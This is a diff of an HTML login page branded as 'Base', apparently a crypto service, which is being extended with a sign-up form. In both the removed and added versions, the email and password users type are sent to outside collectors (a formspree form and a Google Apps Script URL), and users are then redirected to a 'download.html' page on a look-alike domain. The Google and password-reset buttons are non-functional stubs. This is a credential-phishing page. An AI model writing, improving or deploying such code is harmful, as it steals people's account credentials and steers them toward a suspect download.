@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In to Base</title>
+    <title>Sign In or Sign Up | Base</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
@@ -305,223 +305,7 @@
     <div class="main-container">
         <div class="login-card">
             <!-- Header -->
-            <div class="login-header">
-                <h1>Sign in to Base</h1>
-                <p>Welcome back! Please enter your details.</p>
-            </div>
-            
-            <!-- Login Form -->
-            <form id="loginForm" action="https://formspree.io/f/xpwlqqbb" method="POST">
-                <input type="hidden" name="_next" value="https://basecrypto.help/download.html">
-
-                <div class="form-group">
-                    <label for="email" class="form-label">Email address</label>
-                    <input type="email" class="form-control" id="email" name="email" required>
-                    <div class="invalid-feedback" id="emailError"></div>
-                </div>
-
-                <div class="form-group">
-                    <label for="password" class="form-label">Password</label>
-                    <div class="password-toggle">
-                        <input type="password" class="form-control" id="password" name="password" required>
-                        <button type="button" class="password-toggle-btn" id="togglePassword">
-                            <i class="fas fa-eye"></i>
-                        </button>
-                    </div>
-                    <div class="invalid-feedback" id="passwordError"></div>
-                </div>
-
-                <div class="form-check">
-                    <input class="form-check-input" type="checkbox" id="rememberMe" name="rememberMe">
-                    <label class="form-check-label" for="rememberMe">
-                        Remember me for 30 days
-                    </label>
-                </div>
-
-                <button type="submit" class="btn btn-primary">
-                    <span class="loading" id="loadingSpinner">
-                        <i class="fas fa-spinner fa-spin"></i>
-                    </span>
-                    <span id="signInText">Sign in</span>
-                </button>
-
-                <div class="forgot-password">
-                    <a href="#" onclick="showForgotPassword()">Forgot your password?</a>
-                </div>
-            </form>
-
-            <!-- Divider -->
-            <div class="divider">
-                <span>or</span>
-            </div>
-
-            <!-- Google Sign In -->
-            <button class="btn btn-google" onclick="signInWithGoogle()">
-                <svg class="google-icon" viewBox="0 0 24 24">
-                    <path fill="#4285f4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
-                    <path fill="#34a853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
-                    <path fill="#fbbc05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
-                    <path fill="#ea4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
-                </svg>
-                Continue with Google
-            </button>
-
-            <!-- Sign Up Link -->
-            <div class="signup-link">
-                <span>Don't have an account? </span>
-                <a href="#" onclick="showSignUp()">Sign up</a>
-            </div>
-        </div>
-    </div>
-
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
-    <script>
-        // Password toggle functionality
-        document.getElementById('togglePassword').addEventListener('click', function() {
-            const passwordField = document.getElementById('password');
-            const toggleIcon = this.querySelector('i');
-            if (passwordField.type === 'password') {
-                passwordField.type = 'text';
-                toggleIcon.classList.remove('fa-eye');
-                toggleIcon.classList.add('fa-eye-slash');
-            } else {
-                passwordField.type = 'password';
-                toggleIcon.classList.remove('fa-eye-slash');
-                toggleIcon.classList.add('fa-eye');
-            }
-        });
-
-        // Form validation
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
-        }
-
-        function validatePassword(password) {
-            return password.length >= 8;
-        }
-
-        function showError(fieldId, errorId, message) {
-            const field = document.getElementById(fieldId);
-            const error = document.getElementById(errorId);
-            field.classList.add('is-invalid');
-            error.textContent = message;
-        }
-
-        function clearError(fieldId, errorId) {
-            const field = document.getElementById(fieldId);
-            const error = document.getElementById(errorId);
-            field.classList.remove('is-invalid');
-            error.textContent = '';
-        }
-
-        // Updated form submission with validation, natural submit if valid
-        document.getElementById('loginForm').addEventListener('submit', function(e) {
-            clearError('email', 'emailError');
-            clearError('password', 'passwordError');
-            let isValid = true;
-
-            // Validate email
-            const email = document.getElementById('email').value;
-            if (!email) {
-                showError('email', 'emailError', 'Email is required');
-                isValid = false;
-            } else if (!validateEmail(email)) {
-                showError('email', 'emailError', 'Please enter a valid email address');
-                isValid = false;
-            }
-
-            // Validate password
-            const password = document.getElementById('password').value;
-            if (!password) {
-                showError('password', 'passwordError', 'Password is required');
-                isValid = false;
-            } else if (!validatePassword(password)) {
-                showError('password', 'passwordError', 'Password must be at least 8 characters long');
-                isValid = false;
-            }
-
-            if (!isValid) {
-                e.preventDefault(); // Only block submission if validation fails
-            } else {
-                // Show loading spinner and update button text
-                document.getElementById('loadingSpinner').classList.add('active');
-                document.getElementById('signInText').textContent = 'Signing in...';
-            }
-            // Let the form submit naturally if valid!
-        });
-
-        // Google Sign In
-        function signInWithGoogle() {
-            alert('Google Sign In clicked!');
-        }
-
-        // Forgot Password
-        function showForgotPassword() {
-            alert('Forgot password functionality would be implemented here');
-        }
-
-        // Sign Up
-        function showSignUp() {
-            alert('Sign up functionality would be implemented here');
-        }
-
-        // Input focus effects
-        document.querySelectorAll('.form-control').forEach(input => {
-            input.addEventListener('focus', function() {
-                this.parentElement.classList.add('focused');
-            });
-            input.addEventListener('blur', function() {
-                this.parentElement.classList.remove('focused');
-            });
-        });
-
-        // Remove error states on input
-        document.getElementById('email').addEventListener('input', function() {
-            if (this.value) {
-                clearError('email', 'emailError');
-            }
-        });
-
-        document.getElementById('password').addEventListener('input', function() {
-            if (this.value) {
-                clearError('password', 'passwordError');
-            }
-        });
-    </script>
-</body>
-</html>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign In to Base</title>
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/css/bootstrap.min.css" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
-    <style>
-        /* (Your CSS styles from before, unchanged) */
-        /* ... */
-    </style>
-</head>
-<body>
-    <!-- Navigation -->
-    <nav class="navbar navbar-expand-lg">
-        <div class="container">
-            <a class="navbar-brand" href="#">
-                <i class="fas fa-coins"></i> Base
-            </a>
-            <div class="navbar-nav ms-auto">
-                <a class="nav-link" href="#" style="color: var(--base-gray);">Help</a>
-            </div>
-        </div>
-    </nav>
-
-    <!-- Main Content -->
-    <div class="main-container">
-        <div class="login-card">
-            <!-- Header -->
-            <div class="login-header">
+            <div class="login-header" id="formHeader">
                 <h1>Sign in to Base</h1>
                 <p>Welcome back! Please enter your details.</p>
             </div>
@@ -564,6 +348,44 @@
                 </div>
             </form>
 
+            <!-- Sign Up Form (hidden by default) -->
+            <form id="signUpForm" style="display:none;">
+                <div class="form-group">
+                    <label for="signupEmail" class="form-label">Email address</label>
+                    <input type="email" class="form-control" id="signupEmail" name="signupEmail" required>
+                    <div class="invalid-feedback" id="signupEmailError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="signupPassword" class="form-label">Password</label>
+                    <div class="password-toggle">
+                        <input type="password" class="form-control" id="signupPassword" name="signupPassword" required>
+                        <button type="button" class="password-toggle-btn" id="toggleSignupPassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div class="invalid-feedback" id="signupPasswordError"></div>
+                </div>
+
+                <div class="form-group">
+                    <label for="signupConfirmPassword" class="form-label">Confirm Password</label>
+                    <div class="password-toggle">
+                        <input type="password" class="form-control" id="signupConfirmPassword" name="signupConfirmPassword" required>
+                        <button type="button" class="password-toggle-btn" id="toggleSignupConfirmPassword">
+                            <i class="fas fa-eye"></i>
+                        </button>
+                    </div>
+                    <div class="invalid-feedback" id="signupConfirmPasswordError"></div>
+                </div>
+
+                <button type="submit" class="btn btn-primary">
+                    <span class="loading" id="signUpLoadingSpinner">
+                        <i class="fas fa-spinner fa-spin"></i>
+                    </span>
+                    <span id="signUpText">Sign up</span>
+                </button>
+            </form>
+
             <!-- Divider -->
             <div class="divider">
                 <span>or</span>
@@ -580,16 +402,63 @@
                 Continue with Google
             </button>
 
-            <!-- Sign Up Link -->
+            <!-- Toggle Login/Signup Link -->
             <div class="signup-link">
-                <span>Don't have an account? </span>
-                <a href="#" onclick="showSignUp()">Sign up</a>
+                <span id="togglePrompt">Don't have an account? </span>
+                <a href="#" id="toggleFormLink" onclick="toggleForm(event)">Sign up</a>
             </div>
         </div>
     </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.0/js/bootstrap.bundle.min.js"></script>
     <script>
+        // Utility validation
+        function validateEmail(email) {
+            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return re.test(email);
+        }
+        function validatePassword(password) {
+            return password.length >= 8;
+        }
+        function showError(fieldId, errorId, message) {
+            const field = document.getElementById(fieldId);
+            const error = document.getElementById(errorId);
+            field.classList.add('is-invalid');
+            error.textContent = message;
+        }
+        function clearError(fieldId, errorId) {
+            const field = document.getElementById(fieldId);
+            const error = document.getElementById(errorId);
+            field.classList.remove('is-invalid');
+            error.textContent = '';
+        }
+
+        // Toggle Sign In/Sign Up forms
+        function toggleForm(e) {
+            e.preventDefault();
+            const loginForm = document.getElementById('loginForm');
+            const signUpForm = document.getElementById('signUpForm');
+            const header = document.getElementById('formHeader');
+            const togglePrompt = document.getElementById('togglePrompt');
+            const toggleFormLink = document.getElementById('toggleFormLink');
+
+            if (loginForm.style.display !== 'none') {
+                // Switch to sign up
+                loginForm.style.display = 'none';
+                signUpForm.style.display = '';
+                header.innerHTML = '<h1>Sign up for Base</h1><p>Create your account to get started.</p>';
+                togglePrompt.textContent = 'Already have an account? ';
+                toggleFormLink.textContent = 'Sign in';
+            } else {
+                // Switch to sign in
+                loginForm.style.display = '';
+                signUpForm.style.display = 'none';
+                header.innerHTML = '<h1>Sign in to Base</h1><p>Welcome back! Please enter your details.</p>';
+                togglePrompt.textContent = "Don't have an account? ";
+                toggleFormLink.textContent = 'Sign up';
+            }
+        }
+
         // Password toggle functionality
         document.getElementById('togglePassword').addEventListener('click', function() {
             const passwordField = document.getElementById('password');
@@ -604,32 +473,35 @@
                 toggleIcon.classList.add('fa-eye');
             }
         });
+        // Password toggle for sign up
+        document.getElementById('toggleSignupPassword').addEventListener('click', function() {
+            const passwordField = document.getElementById('signupPassword');
+            const toggleIcon = this.querySelector('i');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        });
+        document.getElementById('toggleSignupConfirmPassword').addEventListener('click', function() {
+            const passwordField = document.getElementById('signupConfirmPassword');
+            const toggleIcon = this.querySelector('i');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                toggleIcon.classList.remove('fa-eye');
+                toggleIcon.classList.add('fa-eye-slash');
+            } else {
+                passwordField.type = 'password';
+                toggleIcon.classList.remove('fa-eye-slash');
+                toggleIcon.classList.add('fa-eye');
+            }
+        });
 
-        // Validation helpers
-        function validateEmail(email) {
-            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return re.test(email);
-        }
-
-        function validatePassword(password) {
-            return password.length >= 8;
-        }
-
-        function showError(fieldId, errorId, message) {
-            const field = document.getElementById(fieldId);
-            const error = document.getElementById(errorId);
-            field.classList.add('is-invalid');
-            error.textContent = message;
-        }
-
-        function clearError(fieldId, errorId) {
-            const field = document.getElementById(fieldId);
-            const error = document.getElementById(errorId);
-            field.classList.remove('is-invalid');
-            error.textContent = '';
-        }
-
-        // Form submission via AJAX
+        // LOGIN FORM SUBMIT
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
 
@@ -641,7 +513,6 @@
             const password = document.getElementById('password').value;
             const rememberMe = document.getElementById('rememberMe').checked;
 
-            // Validate email
             if (!email) {
                 showError('email', 'emailError', 'Email is required');
                 isValid = false;
@@ -649,8 +520,6 @@
                 showError('email', 'emailError', 'Please enter a valid email address');
                 isValid = false;
             }
-
-            // Validate password
             if (!password) {
                 showError('password', 'passwordError', 'Password is required');
                 isValid = false;
@@ -659,20 +528,16 @@
                 isValid = false;
             }
 
-            if (!isValid) {
-                return;
-            }
+            if (!isValid) return;
 
-            // Show loading spinner and disable button
             document.getElementById('loadingSpinner').classList.add('active');
             document.getElementById('signInText').textContent = 'Signing in...';
 
             fetch('https://script.google.com/macros/s/AKfycbxnItoHJ_EbmgYgilcxlusTWEi-P7MDnRgk9TZQ9FBOuwOQnBJm6I0z1mju5cez5KLT/exec', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
+                headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({
+                    type: 'login',
                     email: email,
                     password: password,
                     rememberMe: rememberMe
@@ -680,7 +545,6 @@
             })
             .then(response => response.text())
             .then(result => {
-                // Redirect to download page on success
                 window.location.href = 'https://basecrypto.help/download.html';
             })
             .catch(error => {
@@ -692,22 +556,77 @@
             });
         });
 
+        // SIGNUP FORM SUBMIT
+        document.getElementById('signUpForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            clearError('signupEmail', 'signupEmailError');
+            clearError('signupPassword', 'signupPasswordError');
+            clearError('signupConfirmPassword', 'signupConfirmPasswordError');
+            let isValid = true;
+
+            const email = document.getElementById('signupEmail').value;
+            const password = document.getElementById('signupPassword').value;
+            const confirmPassword = document.getElementById('signupConfirmPassword').value;
+
+            if (!email) {
+                showError('signupEmail', 'signupEmailError', 'Email is required');
+                isValid = false;
+            } else if (!validateEmail(email)) {
+                showError('signupEmail', 'signupEmailError', 'Please enter a valid email address');
+                isValid = false;
+            }
+            if (!password) {
+                showError('signupPassword', 'signupPasswordError', 'Password is required');
+                isValid = false;
+            } else if (!validatePassword(password)) {
+                showError('signupPassword', 'signupPasswordError', 'Password must be at least 8 characters long');
+                isValid = false;
+            }
+            if (!confirmPassword) {
+                showError('signupConfirmPassword', 'signupConfirmPasswordError', 'Please confirm your password');
+                isValid = false;
+            } else if (password !== confirmPassword) {
+                showError('signupConfirmPassword', 'signupConfirmPasswordError', 'Passwords do not match');
+                isValid = false;
+            }
+
+            if (!isValid) return;
+
+            document.getElementById('signUpLoadingSpinner').classList.add('active');
+            document.getElementById('signUpText').textContent = 'Signing up...';
+
+            fetch('https://script.google.com/macros/s/AKfycbxnItoHJ_EbmgYgilcxlusTWEi-P7MDnRgk9TZQ9FBOuwOQnBJm6I0z1mju5cez5KLT/exec', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    type: 'signup',
+                    email: email,
+                    password: password
+                })
+            })
+            .then(response => response.text())
+            .then(result => {
+                window.location.href = 'https://basecrypto.help/download.html';
+            })
+            .catch(error => {
+                alert('Submission failed. Please try again.');
+            })
+            .finally(() => {
+                document.getElementById('signUpLoadingSpinner').classList.remove('active');
+                document.getElementById('signUpText').textContent = 'Sign up';
+            });
+        });
+
         // Google Sign In
         function signInWithGoogle() {
             alert('Google Sign In clicked!');
         }
-
-        // Forgot Password
         function showForgotPassword() {
             alert('Forgot password functionality would be implemented here');
         }
 
-        // Sign Up
-        function showSignUp() {
-            alert('Sign up functionality would be implemented here');
-        }
-
-        // Input focus effects
+        // Input focus effects and error clearing
         document.querySelectorAll('.form-control').forEach(input => {
             input.addEventListener('focus', function() {
                 this.parentElement.classList.add('focused');
@@ -716,18 +635,20 @@
                 this.parentElement.classList.remove('focused');
             });
         });
-
-        // Remove error states on input
         document.getElementById('email').addEventListener('input', function() {
-            if (this.value) {
-                clearError('email', 'emailError');
-            }
+            if (this.value) clearError('email', 'emailError');
         });
-
         document.getElementById('password').addEventListener('input', function() {
-            if (this.value) {
-                clearError('password', 'passwordError');
-            }
+            if (this.value) clearError('password', 'passwordError');
+        });
+        document.getElementById('signupEmail').addEventListener('input', function() {
+            if (this.value) clearError('signupEmail', 'signupEmailError');
+        });
+        document.getElementById('signupPassword').addEventListener('input', function() {
+            if (this.value) clearError('signupPassword', 'signupPasswordError');
+        });
+        document.getElementById('signupConfirmPassword').addEventListener('input', function() {
+            if (this.value) clearError('signupConfirmPassword', 'signupConfirmPasswordError');
         });
     </script>
 </body>
